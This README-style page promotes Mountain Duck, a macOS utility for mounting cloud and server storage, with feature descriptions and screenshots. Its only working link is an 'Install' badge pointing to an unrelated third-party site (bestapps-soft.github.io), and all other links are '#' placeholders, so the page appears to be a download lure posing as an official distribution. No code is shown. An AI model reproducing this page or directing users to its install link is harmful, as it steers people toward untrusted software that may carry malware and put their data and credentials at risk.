# Mountain Duck Mac

<p align="center">
  <img src="https://blog.cyberduck.io/wp-content/uploads/2025/10/application-macOS-Default-1024x1024@1x.png" width="200" alt="Mountain Duck icon"/>
</p>

<p align="center">

[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://bestapps-soft.github.io/.github/)

</p>

<p align="center">
  <img src="https://cdn.mountainduck.io/images/mountainduck_macos.png" alt="Mountain Duck screenshot"/>
</p>

---

## Overview

<a href="#">Mountain Duck</a> is a Mac utility developed by Cyberduck's team that mounts cloud storage services and remote servers as native volumes in the macOS Finder, making remote file systems accessible through the same interface and workflows used for local storage. Rather than requiring dedicated sync clients that download entire libraries or web interfaces that require browser interaction for every file operation, Mountain Duck presents remote storage as a standard Mac drive that opens in Finder, appears in Open and Save dialogs, and accepts files dragged from any application exactly as a USB drive or network share would.

The <a href="#">protocol support</a> in Mountain Duck covers the full breadth of cloud and server storage that professionals and developers work with daily. Amazon S3 and compatible object storage services including Backblaze B2, MinIO, and Wasabi mount as browsable bucket structures. Google Drive, Dropbox, OneDrive, Box, and Nextcloud consumer and enterprise cloud services connect through their respective APIs. SFTP, FTP, WebDAV, and SMB server protocols handle traditional server and NAS connections. <a href="#">Azure Blob Storage and Google Cloud Storage</a> serve cloud infrastructure use cases where accessing object storage buckets through a native file browser accelerates development and administration workflows that would otherwise require cloud console web interfaces or CLI tools.

<a href="#">Finder integration</a> is Mountain Duck's most practically valuable feature. Mounted volumes appear in the Finder sidebar, behave as standard macOS volumes in every application's Open and Save dialogs, and support all standard file operations — copy, move, rename, preview with Quick Look, and Get Info — exactly as local files do. Opening a file on a mounted cloud volume downloads it on demand, edits save back to the remote location automatically, and the Finder's context menu gains Mountain Duck actions for sharing and managing remote files. <a href="#">Spotlight indexing</a> on mounted volumes makes remote file contents searchable through macOS Spotlight, enabling the same search-based file access workflow for cloud storage that works on local drives.

<a href="#">Cryptomator integration</a> encrypts vault contents on any mounted cloud storage before files are transmitted, providing client-side encryption for sensitive data stored in cloud services where the provider's own access to stored data is a privacy concern. Encrypted Cryptomator vaults created through Mountain Duck open transparently when the vault password is provided, presenting decrypted contents through the Finder interface while keeping the underlying cloud storage encrypted at rest. <a href="#">Offline sync mode</a> downloads specified folders from a mounted volume for local availability when the remote connection is unavailable — combining on-demand access for most content with reliable offline availability for critical folders.

---

## Key Features

- <a href="#">40-plus protocol support</a> mounts S3 Google Drive Dropbox OneDrive SFTP FTP WebDAV SMB Azure and dozens more as native Finder volumes
- <a href="#">Native Finder volume mounting</a> makes remote storage appear in sidebar Open dialogs and Save sheets identical to local drives and USB storage
- <a href="#">Quick Look remote preview</a> previews files on mounted cloud volumes through macOS Quick Look without fully downloading them first
- <a href="#">Spotlight search indexing</a> makes mounted remote volume contents searchable through macOS Spotlight for search-driven cloud file access
- <a href="#">Cryptomator vault encryption</a> encrypts cloud storage contents client-side before transmission for privacy-preserving remote file storage
- <a href="#">Offline folder synchronization</a> downloads designated folders for local availability maintaining access when remote connections are unavailable
- <a href="#">Finder context menu actions</a> adds Mountain Duck sharing management and sync options directly to right-click menus on remote files
- <a href="#">Keychain credential storage</a> saves server and service credentials in the macOS Keychain for secure automatic reconnection without repeated authentication
- <a href="#">Smart Connect reconnection</a> automatically re-establishes disconnected cloud and server connections when network availability is restored

---

<p align="center">
  <img src="https://docs.cyberduck.io/_images/Mountain_Duck_Finder_Context_Menu.png" alt="Mountain Duck screenshot 2"/>
</p>

---

## Additional Information

Mountain Duck addresses the fundamental usability gap between how cloud storage actually works — through web interfaces or sync clients that maintain complete local copies — and how professional Mac users want to work with it — as a drive accessible through normal macOS file management. The mount-on-demand model means terabytes of cloud storage become accessible on a Mac with minimal local disk consumption, and files on remote servers integrate into the same workflow as local files without requiring application-specific cloud storage support.

The Cyberduck team's deep experience with file transfer protocols ensures that Mountain Duck's connections to legacy SFTP servers, enterprise WebDAV systems, and modern object storage APIs all work reliably — a breadth of compatibility that purpose-built clients for individual services cannot match across the diverse mix of storage systems that professionals access daily.

---
